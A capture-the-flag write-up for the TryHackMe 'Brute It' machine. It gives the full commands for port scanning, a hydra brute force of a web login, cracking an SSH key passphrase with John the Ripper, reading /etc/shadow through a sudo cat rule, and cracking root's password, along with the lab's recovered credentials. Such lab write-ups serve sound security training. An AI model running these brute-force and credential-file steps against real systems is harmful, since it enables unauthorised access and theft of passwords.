## 1. Introduction

### 1.1 Background

**Brute It** is an _Easy_ Linux machine on the **TryHackMe** platform.  
The objective is to compromise the system using **brute force** techniques, web service enumeration, and subsequent **privilege escalation** to gain access as **root**.

### 1.2 Objectives

- Enumerate exposed services.
- Obtain initial access through credentials.
- Escalate privileges to root.

---

## 2. Enumeration

### 2.1 Initial Reconnaissance

We verify connectivity:

```bash
ping -c1 bruteit.thm
```

The host responds correctly.

### 2.2 Nmap

Full port scan:

```bash
sudo nmap -p- -Pn -sS -n --min-rate 5000 bruteit.thm -oN allports --open
```

Relevant open ports:

- 22 → SSH  
- 80 → HTTP  

Detailed scan:

```bash
nmap -p22,80 -sCV -Pn -oN targeted bruteit.thm
```

Identified services:

- **SSH** → OpenSSH  
- **HTTP** → Apache  

### 2.3 Web Enumeration

We access the website:

```url
http://bruteit.thm
```

A page with a login panel is observed at:

```
/admin
```

### 2.4 Brute Force (Login)

The panel does not display visible errors on failed login attempts, so a brute force attack is performed.

Using hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz MACHINE_IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid"
```

Valid credentials are obtained:

```
admin:xavier
```

---

## 3. Exploitation

### 3.1 Access to the Panel

We log in at:

```
/admin
```

Inside the panel, sensitive information is found.

### 3.2 Obtaining SSH Key

An SSH private key (`id_rsa`) is discovered.

```bash
chmod 600 id_rsa
```

### 3.3 SSH Access

We attempt connection:

```bash
ssh john@bruteit.thm -i id_rsa
```

A passphrase is required → we proceed to crack it.

### 3.4 Passphrase Cracking

We use John the Ripper:

```bash
ssha2john id_rsa > hash.txt  
john --wordlist=/usr/share/wordlists/rockyou/rockyou.txt hash.txt
```

Result:

```
rockinroll
```

### 3.5 User Access

```bash
ssh john@bruteit.thm -i id_rsa
```

Enter passphrase:

```
rockinroll
```

Successful access as:

```
john
```

---

## 4. Privilege Escalation

### 4.1 Sudo Enumeration

```bash
sudo -l
```

Output:

```bash
john ALL=NOPASSWD: /bin/cat
```

### 4.2 Reading Sensitive Files

We leverage the privilege:

```bash
sudo cat /etc/shadow
```

System hashes are obtained.

### 4.3 Password Cracking

We save them in `shadow.txt` and use John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou/rockyou.txt shadow.txt
```

Result:

```bash
root:football
```

### 4.4 Privilege Escalation to root

We test the password:

```bash
su root
```

Password:

```
football
```
